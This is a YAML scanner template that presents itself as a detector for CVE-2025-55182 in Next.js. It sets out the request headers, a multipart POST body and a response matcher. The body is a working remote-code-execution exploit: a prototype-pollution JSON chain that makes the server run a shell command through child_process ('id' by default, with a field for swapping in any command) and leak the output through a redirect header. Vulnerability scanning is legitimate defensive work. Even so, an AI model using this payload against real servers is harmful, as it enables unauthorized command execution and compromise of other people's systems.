version: 1.0.0
name: CVE-2025-55182
author: Specter Team
description: Detects the presence of the CVE-2025-55182 vulnerability in Next
severity: high

framework: Next.js

language: Javascript/Typescript

technology: React

headers:
  Next-Action: "x"
  X-Nextjs-Request-Id: "214c185f"
  X-Nextjs-Html-Request-Id: "5d329eaee6cc34a888a1"
  Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
  User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

timeout: 15
method: "POST"

payloads:
  - name: "default"
    description: "Default RCE payload"
    command_placeholder: "id"
    json_template: |
      {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('id').toString().trim().replace(/\\n/g, ' | ');;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}

    multipart_form_data:
      - name: "0"
        content: |
          {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('id').toString().trim().replace(/\\n/g, ' | ');;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
      - name: "1"
        content: '"$@0"'
      - name: "2"
        content: "[]"

matchers:
  type: "header"
  name: "X-Action-Redirect"
  extract_regex: "/login\\?a=([^;]*)"
  decode_url: true
  decode_pipes: true
  output_var: "command_result"
